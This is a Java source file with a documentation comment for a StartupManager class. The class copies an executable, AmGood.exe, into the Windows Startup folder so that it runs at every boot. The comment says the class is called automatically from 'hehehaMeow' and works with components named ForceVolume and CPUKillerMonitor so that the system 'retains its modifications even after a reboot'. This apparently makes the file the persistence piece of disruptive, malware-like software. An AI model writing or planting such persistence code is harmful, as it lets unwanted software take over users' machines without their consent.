/**
 * The `StartupManager` class is responsible for **automatically copying an executable file**
 * (`AmGood.exe`) to the Windows **Startup folder**, ensuring that it runs every time the system starts.
 *
 * ### Functionality:
 * - Identifies the current working directory where `AmGood.exe` is located.
 * - Determines the **Startup folder path** using the system's `APPDATA` environment variable.
 * - Copies `AmGood.exe` to the **Startup folder**, replacing any existing version.
 *
 * ### Behavior:
 * - **Checks if the source file exists** before attempting to copy.
 * - Uses `Files.copy()` with `StandardCopyOption.REPLACE_EXISTING` to ensure the latest version is always copied.
 * - Logs messages to the console indicating success or failure.
 *
 * ### Integration:
 * - This class is **automatically called from `hehehaMeow`**, ensuring that `AmGood.exe`
 *   is placed in the Startup folder when the application runs.
 * - Works in tandem with **ForceVolume** and **CPUKillerMonitor**, ensuring that the system
 *   retains its modifications even after a reboot.
 *
 * ### Key Methods:
 * - `addToStartup()`: Copies `AmGood.exe` from the current directory to the Startup folder.
 *
 * ### Notes:
 * - **Windows-only**: This approach relies on the Windows Startup folder mechanism.
 * - **Requires necessary permissions**: If the user doesn't have write access to the Startup folder,
 *   this operation may fail.
 */

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class StartupManager {

    public static void addToStartup() {
        // Define the source file (AmGood.exe) and the destination directory (Startup folder)
        String sourcePath = System.getProperty("user.dir") + File.separator + "AmGood.exe"; // Assumes AmGood.exe is in the current directory
        String startupFolder = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

        try {
            // Check if the source file exists
            File sourceFile = new File(sourcePath);
            if (!sourceFile.exists()) {
                System.out.println("Source file not found: " + sourcePath);
                return;
            }

            // Copy the file to the startup folder
            File destinationFile = new File(startupFolder, sourceFile.getName());
            Files.copy(sourceFile.toPath(), destinationFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            System.out.println("File copied to Startup folder: " + destinationFile.getAbsolutePath());
        } catch (IOException e) {
            System.err.println("Failed to copy file to Startup folder: " + e.getMessage());
        }
    }
}
